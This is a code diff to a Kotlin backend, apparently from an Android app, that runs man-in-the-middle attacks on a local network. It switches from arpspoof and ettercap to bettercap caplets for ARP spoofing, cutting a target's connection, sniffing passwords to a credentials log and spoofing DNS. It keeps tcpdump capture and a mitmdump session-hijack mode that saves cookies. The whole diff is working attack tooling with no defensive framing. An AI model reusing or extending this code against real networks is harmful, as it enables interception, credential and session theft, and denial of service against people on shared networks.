@@ -73,8 +73,7 @@ class ExternalToolMitmBackend(
         val config = toolchainProbe.loadConfig()
         val startedAt = System.currentTimeMillis()
         val sessionDirectory = sessionStore.createSessionDirectory(startedAt)
-        val mainLogFile = File(sessionDirectory, "main.log")
-        val arpLogFile = File(sessionDirectory, "arpspoof.log")
+        val mainLogFile = File(sessionDirectory, "bettercap.log")
         val pidList = mutableListOf<Long>()
         var artifactPath = ""
         var redirectPort = 0
@@ -87,7 +86,7 @@ class ExternalToolMitmBackend(
                     interfaceName = interfaceName,
                     targetHost = targetHost,
                     sessionDirectory = sessionDirectory,
-                    arpLogFile = arpLogFile,
+                    logFile = mainLogFile,
                     pidList = pidList
                 )
 
@@ -100,14 +99,13 @@ class ExternalToolMitmBackend(
                         targetHost = targetHost,
                         artifactPath = artifactPath,
                         sessionDirectory = sessionDirectory,
-                        arpLogFile = arpLogFile,
-                        mainLogFile = mainLogFile,
+                        logFile = mainLogFile,
                         pidList = pidList
                     )
                 }
 
                 MitmMode.PASSWORD_SNIFFER -> {
-                    artifactPath = File(sessionDirectory, "passwords.log").absolutePath
+                    artifactPath = File(sessionDirectory, "credentials.log").absolutePath
                     forwardingEnabled = true
                     startPasswordSniffer(
                         config = config,
@@ -115,13 +113,12 @@ class ExternalToolMitmBackend(
                         targetHost = targetHost,
                         artifactPath = artifactPath,
                         sessionDirectory = sessionDirectory,
-                        arpLogFile = arpLogFile,
                         pidList = pidList
                     )
                 }
 
                 MitmMode.DNS_SPOOF -> {
-                    artifactPath = File(sessionDirectory, "etter.dns").absolutePath
+                    artifactPath = File(sessionDirectory, "dns.spoof.hosts").absolutePath
                     forwardingEnabled = true
                     startDnsSpoof(
                         config = config,
@@ -130,8 +127,7 @@ class ExternalToolMitmBackend(
                         dnsRules = request.payloadValue,
                         artifactPath = artifactPath,
                         sessionDirectory = sessionDirectory,
-                        arpLogFile = arpLogFile,
-                        mainLogFile = mainLogFile,
+                        logFile = mainLogFile,
                         pidList = pidList
                     )
                 }
@@ -151,8 +147,7 @@ class ExternalToolMitmBackend(
                         interfaceName = interfaceName,
                         redirectPort = redirectPort,
                         sessionDirectory = sessionDirectory,
-                        arpLogFile = arpLogFile,
-                        mainLogFile = mainLogFile,
+                        logFile = mainLogFile,
                         pidList = pidList
                     )
                 }
@@ -178,11 +173,7 @@ class ExternalToolMitmBackend(
                 resourceProvider.getString(request.mode.titleRes),
                 targetHost
             ),
-            logPath = if (request.mode == MitmMode.CONNECTION_KILL) {
-                arpLogFile.absolutePath
-            } else {
-                mainLogFile.absolutePath
-            },
+            logPath = mainLogFile.absolutePath,
             artifactPath = artifactPath,
             startedAtEpochMs = startedAt
         )
@@ -225,22 +216,18 @@ class ExternalToolMitmBackend(
         interfaceName: String,
         targetHost: String,
         sessionDirectory: File,
-        arpLogFile: File,
+        logFile: File,
         pidList: MutableList<Long>
     ) {
-        val gateway = resolveGateway(interfaceName)
-            ?: throw IllegalArgumentException(
-                resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
-            )
-        val arpPid = startDetachedProcess(
-            name = "arpspoof",
+        val pid = startBettercapCaplet(
+            config = config,
+            name = "connection_kill",
+            interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
-            logFile = arpLogFile,
-            body = buildArpspoofScript(config, interfaceName, targetHost, gateway)
-        ) ?: throw IllegalArgumentException(
-            resourceProvider.getString(R.string.mitm_session_start_failed)
-        )
-        pidList += arpPid
+            logFile = logFile,
+            capletContent = buildArpBanCaplet(targetHost)
+        ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
+        pidList += pid
     }
 
     private fun startSniffer(
@@ -249,30 +236,27 @@ class ExternalToolMitmBackend(
         targetHost: String,
         artifactPath: String,
         sessionDirectory: File,
-        arpLogFile: File,
-        mainLogFile: File,
+        logFile: File,
         pidList: MutableList<Long>
     ) {
-        val gateway = resolveGateway(interfaceName)
-            ?: throw IllegalArgumentException(
-                resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
-            )
         setForwarding(true)
-        val arpPid = startDetachedProcess(
-            name = "arpspoof",
+        val bettercapPid = startBettercapCaplet(
+            config = config,
+            name = "spoof_relay",
+            interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
-            logFile = arpLogFile,
-            body = buildArpspoofScript(config, interfaceName, targetHost, gateway)
+            logFile = logFile,
+            capletContent = buildArpSpoofCaplet(targetHost)
         )
-        arpPid?.let(pidList::add)
+        bettercapPid?.let(pidList::add)
         val tcpdumpPid = startDetachedProcess(
-            name = "tcpdump",
+            name = "tcpdump_capture",
             sessionDirectory = sessionDirectory,
-            logFile = mainLogFile,
+            logFile = File(artifactPath),
             body = buildTcpdumpScript(config, interfaceName, targetHost, artifactPath)
         )
         tcpdumpPid?.let(pidList::add)
-        if (arpPid == null || tcpdumpPid == null) {
+        if (bettercapPid == null || tcpdumpPid == null) {
             throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
         }
     }
@@ -283,29 +267,19 @@ class ExternalToolMitmBackend(
         targetHost: String,
         artifactPath: String,
         sessionDirectory: File,
-        arpLogFile: File,
         pidList: MutableList<Long>
     ) {
-        val gateway = resolveGateway(interfaceName)
-            ?: throw IllegalArgumentException(
-                resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
-            )
         setForwarding(true)
-        val arpPid = startDetachedProcess(
-            name = "arpspoof",
-            sessionDirectory = sessionDirectory,
-            logFile = arpLogFile,
-            body = buildArpspoofScript(config, interfaceName, targetHost, gateway)
-        )
-        arpPid?.let(pidList::add)
-        val ettercapPid = startDetachedProcess(
-            name = "ettercap-passwords",
+        val bettercapPid = startBettercapCaplet(
+            config = config,
+            name = "password_sniff",
+            interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
             logFile = File(artifactPath),
-            body = buildEttercapPasswordScript(config, interfaceName, targetHost)
+            capletContent = buildPasswordSniffCaplet(targetHost)
         )
-        ettercapPid?.let(pidList::add)
-        if (arpPid == null || ettercapPid == null) {
+        bettercapPid?.let(pidList::add)
+        if (bettercapPid == null) {
             throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
         }
     }
@@ -317,34 +291,24 @@ class ExternalToolMitmBackend(
         dnsRules: String,
         artifactPath: String,
         sessionDirectory: File,
-        arpLogFile: File,
-        mainLogFile: File,
+        logFile: File,
         pidList: MutableList<Long>
     ) {
-        val gateway = resolveGateway(interfaceName)
-            ?: throw IllegalArgumentException(
-                resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
-            )
         if (dnsRules.trim().isEmpty()) {
             throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_dns_rules_required))
         }
-        File(artifactPath).writeText(dnsRules.trim() + "\n")
+        File(artifactPath).writeText(normalizeBettercapDnsRules(dnsRules))
         setForwarding(true)
-        val arpPid = startDetachedProcess(
-            name = "arpspoof",
+        val bettercapPid = startBettercapCaplet(
+            config = config,
+            name = "dns_spoof",
+            interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
-            logFile = arpLogFile,
-            body = buildArpspoofScript(config, interfaceName, targetHost, gateway)
+            logFile = logFile,
+            capletContent = buildDnsSpoofCaplet(targetHost, artifactPath)
         )
-        arpPid?.let(pidList::add)
-        val ettercapPid = startDetachedProcess(
-            name = "ettercap-dns",
-            sessionDirectory = sessionDirectory,
-            logFile = mainLogFile,
-            body = buildEttercapDnsScript(config, interfaceName, targetHost, sessionDirectory)
-        )
-        ettercapPid?.let(pidList::add)
-        if (arpPid == null || ettercapPid == null) {
+        bettercapPid?.let(pidList::add)
+        if (bettercapPid == null) {
             throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
         }
     }
@@ -356,14 +320,9 @@ class ExternalToolMitmBackend(
         interfaceName: String,
         redirectPort: Int,
         sessionDirectory: File,
-        arpLogFile: File,
-        mainLogFile: File,
+        logFile: File,
         pidList: MutableList<Long>
     ): String {
-        val gateway = resolveGateway(interfaceName)
-            ?: throw IllegalArgumentException(
-                resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
-            )
         val addonFile = File(sessionDirectory, "mitm_addon.py")
         val artifactPath = if (request.mode == MitmMode.SESSION_HIJACK) {
             File(sessionDirectory, "cookies.jsonl").absolutePath
@@ -373,25 +332,24 @@ class ExternalToolMitmBackend(
         addonFile.writeText(buildMitmdumpAddon(request, artifactPath))
 
         val mitmdumpPid = startDetachedProcess(
-            name = "mitmdump",
+            name = "mitmdump_http",
             sessionDirectory = sessionDirectory,
-            logFile = mainLogFile,
+            logFile = logFile,
             body = buildMitmdumpScript(config, addonFile, redirectPort)
-        ) ?: throw IllegalArgumentException(
-            resourceProvider.getString(R.string.mitm_session_start_failed)
-        )
+        ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
         pidList += mitmdumpPid
+
         setForwarding(true)
         applyPortRedirect(redirectPort)
-        val arpPid = startDetachedProcess(
-            name = "arpspoof",
+        val bettercapPid = startBettercapCaplet(
+            config = config,
+            name = "http_relay",
+            interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
-            logFile = arpLogFile,
-            body = buildArpspoofScript(config, interfaceName, targetHost, gateway)
-        ) ?: throw IllegalArgumentException(
-            resourceProvider.getString(R.string.mitm_session_start_failed)
-        )
-        pidList += arpPid
+            logFile = logFile,
+            capletContent = buildArpSpoofCaplet(targetHost)
+        ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
+        pidList += bettercapPid
         return artifactPath
     }
 
@@ -418,20 +376,23 @@ class ExternalToolMitmBackend(
     private fun missingToolSummary(mode: MitmMode, readiness: MitmReadiness): String? {
         return when (mode) {
             MitmMode.CONNECTION_KILL ->
-                if (!readiness.arpspoofAvailable) resourceProvider.getString(R.string.mitm_missing_arpspoof) else null
+                if (!readiness.bettercapAvailable) resourceProvider.getString(R.string.mitm_missing_bettercap) else null
+
             MitmMode.SNIFFER ->
                 when {
-                    !readiness.arpspoofAvailable -> resourceProvider.getString(R.string.mitm_missing_arpspoof)
+                    !readiness.bettercapAvailable -> resourceProvider.getString(R.string.mitm_missing_bettercap)
                     !readiness.tcpdumpAvailable -> resourceProvider.getString(R.string.mitm_missing_tcpdump)
                     else -> null
                 }
+
             MitmMode.PASSWORD_SNIFFER,
             MitmMode.DNS_SPOOF ->
-                when {
-                    !readiness.arpspoofAvailable -> resourceProvider.getString(R.string.mitm_missing_arpspoof)
-                    !readiness.ettercapAvailable -> resourceProvider.getString(R.string.mitm_missing_ettercap)
-                    else -> null
+                if (!readiness.bettercapAvailable) {
+                    resourceProvider.getString(R.string.mitm_missing_bettercap)
+                } else {
+                    null
                 }
+
             MitmMode.REDIRECT,
             MitmMode.IMAGE_REPLACE,
             MitmMode.VIDEO_REPLACE,
@@ -439,7 +400,7 @@ class ExternalToolMitmBackend(
             MitmMode.CUSTOM_FILTER,
             MitmMode.SESSION_HIJACK ->
                 when {
-                    !readiness.arpspoofAvailable -> resourceProvider.getString(R.string.mitm_missing_arpspoof)
+                    !readiness.bettercapAvailable -> resourceProvider.getString(R.string.mitm_missing_bettercap)
                     !readiness.iptablesAvailable -> resourceProvider.getString(R.string.mitm_missing_iptables)
                     !readiness.mitmdumpAvailable -> resourceProvider.getString(R.string.mitm_missing_mitmdump)
                     else -> null
@@ -447,13 +408,84 @@ class ExternalToolMitmBackend(
         }
     }
 
-    private fun buildArpspoofScript(
+    private fun startBettercapCaplet(
+        config: MitmToolchainConfig,
+        name: String,
+        interfaceName: String,
+        sessionDirectory: File,
+        logFile: File,
+        capletContent: String
+    ): Long? {
+        val capletFile = File(sessionDirectory, "$name.cap")
+        capletFile.writeText(capletContent)
+        return startDetachedProcess(
+            name = name,
+            sessionDirectory = sessionDirectory,
+            logFile = logFile,
+            body = buildBettercapScript(config, interfaceName, capletFile)
+        )
+    }
+
+    private fun buildBettercapScript(
         config: MitmToolchainConfig,
         interfaceName: String,
-        targetHost: String,
-        gateway: String
+        capletFile: File
     ): String {
-        return "exec ${shellCommandToken(config.arpspoofPath)} -i ${shellQuote(interfaceName)} -t ${shellQuote(targetHost)} ${shellQuote(gateway)}\n"
+        return buildString {
+            append("exec ")
+            append(shellCommandToken(config.bettercapPath))
+            append(" -iface ")
+            append(shellQuote(interfaceName))
+            append(" -no-colors -caplet ")
+            append(shellQuote(capletFile.absolutePath))
+            append('\n')
+        }
+    }
+
+    private fun buildArpBanCaplet(targetHost: String): String {
+        return """
+set events.stream.output stdout
+set arp.spoof.targets $targetHost
+arp.ban on
+sleep 31536000
+""".trimIndent()
+    }
+
+    private fun buildArpSpoofCaplet(targetHost: String): String {
+        return """
+set events.stream.output stdout
+set arp.spoof.fullduplex true
+set arp.spoof.targets $targetHost
+arp.spoof on
+sleep 31536000
+""".trimIndent()
+    }
+
+    private fun buildPasswordSniffCaplet(targetHost: String): String {
+        return """
+set events.stream.output stdout
+set arp.spoof.fullduplex true
+set arp.spoof.targets $targetHost
+arp.spoof on
+set net.sniff.local false
+set net.sniff.verbose false
+set net.sniff.filter "host $targetHost and not arp"
+net.sniff on
+sleep 31536000
+""".trimIndent()
+    }
+
+    private fun buildDnsSpoofCaplet(targetHost: String, hostsFilePath: String): String {
+        return """
+set events.stream.output stdout
+set arp.spoof.fullduplex true
+set arp.spoof.targets $targetHost
+arp.spoof on
+set dns.spoof.all false
+set dns.spoof.hosts ${hostsFilePath}
+dns.spoof on
+sleep 31536000
+""".trimIndent()
     }
 
     private fun buildTcpdumpScript(
@@ -463,34 +495,6 @@ class ExternalToolMitmBackend(
         artifactPath: String
     ): String {
         return "exec ${shellCommandToken(config.tcpdumpPath)} -i ${shellQuote(interfaceName)} -n -s 0 host ${shellQuote(targetHost)} and not arp -w ${shellQuote(artifactPath)}\n"
-    }
-
-    private fun buildEttercapPasswordScript(
-        config: MitmToolchainConfig,
-        interfaceName: String,
-        targetHost: String
-    ): String {
-        return "exec ${shellCommandToken(config.ettercapPath)} -Tpq -i ${shellQuote(interfaceName)} /${shellEscapeToken(targetHost)}// ///\n"
-    }
-
-    private fun buildEttercapDnsScript(
-        config: MitmToolchainConfig,
-        interfaceName: String,
-        targetHost: String,
-        sessionDirectory: File
-    ): String {
-        return buildString {
-            append("cd ")
-            append(shellQuote(sessionDirectory.absolutePath))
-            append(" || exit 1\n")
-            append("exec ")
-            append(shellCommandToken(config.ettercapPath))
-            append(" -Tq -P dns_spoof -i ")
-            append(shellQuote(interfaceName))
-            append(" /")
-            append(shellEscapeToken(targetHost))
-            append("// ///\n")
-        }
     }
 
     private fun buildMitmdumpScript(
@@ -681,6 +685,22 @@ def request(flow: http.HTTPFlow) -> None:
 """.trimIndent()
     }
 
+    private fun normalizeBettercapDnsRules(rawRules: String): String {
+        return rawRules.lineSequence()
+            .map { it.trim() }
+            .filter { it.isNotEmpty() }
+            .joinToString("\n") { line ->
+                val tokens = line.split(Regex("\\s+"))
+                when {
+                    tokens.size >= 3 && tokens[1].equals("A", ignoreCase = true) ->
+                        "${tokens[2]} ${tokens[0]}"
+                    tokens.size >= 2 ->
+                        "${tokens[1]} ${tokens[0]}"
+                    else -> throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_filter_rule_invalid, line))
+                }
+            } + "\n"
+    }
+
     private fun startDetachedProcess(
         name: String,
         sessionDirectory: File,
@@ -725,18 +745,6 @@ def request(flow: http.HTTPFlow) -> None:
             asRoot = true,
             timeoutMs = PROBE_TIMEOUT_MS
         )
-    }
-
-    private fun resolveGateway(interfaceName: String): String? {
-        val result = shellRepository.execute(
-            command = "ip route show | while read -r a b c d e f rest; do if [ \"\$a\" = default ] && [ \"\$e\" = ${shellQuote(interfaceName)} ]; then echo \"\$c\"; break; fi; done",
-            asRoot = true,
-            timeoutMs = PROBE_TIMEOUT_MS
-        )
-        val gateway = result.output.lineSequence()
-            .map { it.trim() }
-            .firstOrNull { it.isNotEmpty() }
-        return validateIpv4(gateway.orEmpty())
     }
 
     private fun isProcessAlive(pid: Long): Boolean {
@@ -800,10 +808,6 @@ def request(flow: http.HTTPFlow) -> None:
 
     private fun shellQuote(value: String): String {
         return "'" + value.replace("'", "'\"'\"'") + "'"
-    }
-
-    private fun shellEscapeToken(value: String): String {
-        return value.replace("/", "")
     }
 
     private fun shellCommandToken(value: String): String {
